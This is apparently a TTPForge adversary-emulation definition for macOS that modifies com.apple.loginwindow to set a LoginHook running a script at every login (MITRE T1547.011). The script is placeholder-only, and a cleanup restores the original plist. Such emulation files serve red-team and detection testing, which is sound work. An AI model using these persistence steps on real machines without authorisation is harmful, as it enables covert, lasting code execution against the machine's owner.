---
api_version: 2.0
uuid: a8162771-9bc8-4604-9d9b-33dafd9144b0
name: Modify login.plist
authors:
- TTPForge
description: |
  Modifies login window plist to execute code during login process
mitre:
  tactics:
  - TA0003 Persistence
  techniques:
  - T1547 Boot or Logon Autostart Execution
  subtechniques:
  - 'T1547.011 Boot or Logon Autostart Execution: Plist Modification'
requirements:
  platforms:
  - os: darwin
args:
- name: plist_path
  description: Path to login plist
  type: string
  default: ~/Library/Preferences/com.apple.loginwindow.plist
- name: backup_path
  description: Path to backup the original plist
  type: string
  default: ~/Library/Preferences/com.apple.loginwindow.plist.bak
- name: app_path
  description: Path to application or script to launch at login
  type: string
  default: /usr/local/bin/loginagent
steps:
- name: backup_original_plist
  inline: cp {{ .Args.plist_path }} {{ .Args.backup_path }} 2>/dev/null || true
- name: create_launch_script
  create_file: '{{ .Args.app_path }}'
  contents: |
    #!/bin/bash
    echo "Login hook executed at $(date)" >> /tmp/login.log
    # Persistence payload
  mode: 493
  cleanup: default
- name: modify_login_plist
  inline: |
    defaults write ~/Library/Preferences/com.apple.loginwindow LoginHook "{{ .Args.app_path }}"
  cleanup:
    inline: |-
      defaults delete ~/Library/Preferences/com.apple.loginwindow LoginHook 2>/dev/null || true
      if [ -f "{{ .Args.backup_path }}" ]; then
        cp {{ .Args.backup_path }} {{ .Args.plist_path }}
        rm {{ .Args.backup_path }}
      fi

      rm -f "{{ .Args.app_path }}"
      rm -f "/tmp/login.log"
tests:
- name: dry_run_test
  dry_run: true
